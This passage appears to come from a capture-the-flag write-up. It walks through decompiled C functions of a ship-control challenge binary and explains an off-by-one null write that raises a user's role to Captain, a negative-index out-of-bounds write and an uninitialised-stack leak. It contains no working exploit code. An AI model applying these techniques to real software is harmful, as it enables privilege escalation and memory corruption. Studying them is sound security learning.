<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_register</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Register ]===&gt;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a username: &quot;</span>);</span><br><span class="line">  read_input(&amp;local_118,<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(curr_user,(<span class="type">char</span> *)&amp;local_118,<span class="number">0x100</span>);</span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(curr_user);</span><br><span class="line">  *(<span class="type">size_t</span> *)(curr_user + <span class="number">0x108</span>) = sVar1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this function read the given username and store it to address pointed by  local_188 vairable which is of 0x100(256) size and then username is being copied to global username curr_user as well as as length of the username string plus one at an offset of <code>0x108</code> bytes from the start of the <code>curr_user</code> buffer</p>
<p>user_edit function :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_edit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> user_length;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">  <span class="type">size_t</span> idx;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Edit Username ]===&gt;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New username size: &quot;</span>);</span><br><span class="line">  user_length = read_num();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> (*(ulong *)(curr_user + <span class="number">0x108</span>) &lt; (ulong)(<span class="type">long</span>)user_length) &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Can\&#x27;t be larger than the current username.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>((<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (buf == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Please replace the memory catridge.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,(<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your new username: &quot;</span>);</span><br><span class="line">    fgets(buf,user_length,<span class="built_in">stdin</span>);</span><br><span class="line">    idx = <span class="built_in">strcspn</span>(buf,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    buf[idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(curr_user,buf,(<span class="type">long</span>)(user_length + <span class="number">1</span>));</span><br><span class="line">    log_message(<span class="number">0</span>,<span class="string">&quot;User updated successfully!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>function  <code>user_edit</code>  is responsible for allowing a user to edit their username.</p>
<p>working of this funciton : </p>
<ul>
<li>initially it ask for size of new username that being stored in user_length variable by <code>read_num</code> function </li>
<li>condition to verify user_length cant be larger than current username(as you can see “curr_user + 0x108” is lenght of curr_user itself i.e. current username)</li>
<li>allocate block of memory(user_length+1) to char array <strong>buf</strong> </li>
<li>and then <code>memset</code> functionset “user_length + 1” bytes of memory starting from the address pointed to by “buf” to zero.</li>
</ul>
<p>we have Off By One bug in this block of code, if you see at <strong>if condition</strong> it only check user_length shouldn’t be greater than curr_user but can be equal i.e. 0x100(256).<br>as curr_user size is 0x100 itself while setting the “user_length + 1” number of zero’s to buf at <code>memset</code> function it is going to set 257 byte of null, which mean it will write one null byte beyond the curr_user username that allows us to switch our role from Crew to Captain lets see how</p>
<p>menu function: </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    print_current_role();</span><br><span class="line">    uVar1 = read_option(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selection: %d\n&quot;</span>,(ulong)uVar1);</span><br><span class="line">    <span class="keyword">switch</span>(uVar1) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Invalid option\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      configure_engine();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      check_engines();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      change_route();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      view_route();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      change_role();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>inside menu function we do have other function lets jump to <code>print_current_role</code> first </p>
<p>print_current_role function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_current_role</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  iVar1 = *(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">2</span>) &#123;</span><br><span class="line">    log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Crew\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> &lt; iVar1) &#123;</span><br><span class="line">LAB_00401fd1:</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;How did you get here?!\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0x539</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Captain\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) <span class="keyword">goto</span> LAB_00401fd1;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Current Role: Technician\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>function first reads the value of the “curr_user” global variable at offset 0x100, so if you remember in function <code>setup</code> “curr_user + 0x100” is assigned to 2.<br>It then uses a series of if&#x2F;else statements to determine the user’s role based on the value of this integer.</p>
<p>If the integer value is equal to 2, the function logs a message indicating that the user’s current role is “Crew”. If the integer value is equal to 0, the function logs a message indicating that the user’s current role is “Captain”. If the integer value is equal to 1, the function logs a message indicating that the user’s current role is “Technician”.</p>
<p>so if “curr+user + 0x100” is</p>
<ul>
<li>0 &#x3D;&gt; Captain</li>
<li>1 &#x3D;&gt; Technician</li>
<li>2 &#x3D;&gt; Crew - current role</li>
</ul>
<p>Using Off-ByOne write we can set “curr_user + 0x100”  to 0 i.e. Captain </p>
<p>Configure_engine function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">configure_engine</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint num;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_13;</span><br><span class="line">  undefined local_11;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_13 = <span class="number">0</span>;</span><br><span class="line">  local_11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nEngine number [0-%d]: &quot;</span>,<span class="number">3</span>);</span><br><span class="line">    num = read_num();</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)num &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Engine [%d]: \n&quot;</span>,(ulong)num);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tThrust: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,&amp;local_28);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tMixture ratio: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,&amp;local_20);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDo you want to save the configuration? (y/n) &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">    fgets((<span class="type">char</span> *)&amp;local_13,<span class="number">3</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)&amp;local_13 + sVar2) = <span class="number">0</span>;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      *(undefined8 *)(engines + (<span class="type">long</span>)(<span class="type">int</span>)num * <span class="number">0x10</span>) = local_28;</span><br><span class="line">      *(undefined8 *)(engines + (<span class="type">long</span>)(<span class="type">int</span>)num * <span class="number">0x10</span> + <span class="number">8</span>) = local_20;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;Engine configuration updated successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Engine configuration cancelled.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only technicians are allowed to configure the engines&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>as this function about engine we need to switch Technician role,<br>the <code>undefined8</code> data type used for <code>local_28</code>  and <code>local_20</code> can hold both signed and unsigned values, as it is an undefined data type that represents an 8-byte (64-bit) value whose purpose or contents are unknown or undefined, resulting in an out-of-bounds write (precisely, buffer underflow write if i am not wrong) to the address preceding the engines.</p>
<p>check_engine function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_engines</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[===&lt; Engine Check &gt;===]&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (local_c = <span class="number">0</span>; local_c &lt; <span class="number">4</span>; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="number">100</span> &lt; *(<span class="type">long</span> *)(engines + (<span class="type">long</span>)local_c * <span class="number">0x10</span>)) ||</span><br><span class="line">         (<span class="number">100</span> &lt; *(<span class="type">long</span> *)(engines + (<span class="type">long</span>)local_c * <span class="number">0x10</span> + <span class="number">8</span>))) &#123;</span><br><span class="line">        log_message(<span class="number">3</span>,<span class="string">&quot;Faulty configuration found.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;All engines are configured correctly.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only technicians are allowed to check the engines.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this function seems to bug free</p>
<p>change_route function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change_route</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  undefined8 local_58 [<span class="number">4</span>];</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_13;</span><br><span class="line">  undefined local_11;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_13 = <span class="number">0</span>;</span><br><span class="line">  local_11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;===[ Coordinates [%d] ]===&gt;\n&quot;</span>,(ulong)(i + <span class="number">1</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tLatitude  : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,local_58 + (<span class="type">long</span>)i * <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tLongitude : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDo you want to save the route? (y/n) &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">    fgets((<span class="type">char</span> *)&amp;local_13,<span class="number">3</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)&amp;local_13 + sVar2) = <span class="number">0</span>;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      route._0_8_ = local_58[<span class="number">0</span>];</span><br><span class="line">      route._8_8_ = local_58[<span class="number">1</span>];</span><br><span class="line">      route._16_8_ = local_58[<span class="number">2</span>];</span><br><span class="line">      route._24_8_ = local_58[<span class="number">3</span>];</span><br><span class="line">      route._32_8_ = local_38;</span><br><span class="line">      route._40_8_ = local_30;</span><br><span class="line">      route._48_8_ = local_28;</span><br><span class="line">      route._56_8_ = local_20;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;The route has been successfully updated!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Operation cancelled&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only the captain is allowed to change the ship\&#x27;s route\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Only accessible by Captain.<br>This function contains two errors. The first issue is with how it scans input values. If an invalid input is entered while calling __isoc99_scanf(&amp;DAT_0040330e,local_58 + (long)i * 2); and __isoc99_scanf(&amp;DAT_0040330e); (such as entering a non-numeric character), the scanf function will skip and move to the next line of code. The second problem is that there is no error handling mechanism in place to deal with failed scans, which means that even if the scanf fails, the function will still copy the value stored in the stack to the route variable.</p>
<p>it is apparent that there is no procedure in place to remove the data from the stack prior to its utilization. This, in combination with the absence of a mechanism to handle failures in the scanf operation, means that it is feasible for the route value to be assigned with data from the stack. If we happen to be fortunate, this could contain some confidential information that must not be disclosed, such as a libc address. This kind of bug is called UDA (Uninitialied Data Access).</p>
<p>view_route function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">view_route</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Route ]===&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">      print_coordinates(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only the captain is allowed to view the ship\&#x27;s route.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>printing the all route value stored in the stack to the route variable in previous function.</p>
<p>change_role function:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change_role</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Available roles ]===&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Technician: 1 | Crew: 2&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;New role: &quot;</span>);</span><br><span class="line">    iVar1 = read_num();</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">1</span>) || (iVar1 == <span class="number">0</span>)) &#123;</span><br><span class="line">      *(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) = iVar1;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;New role has been set successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Invalid role.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only Captain is allowed to change roles.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

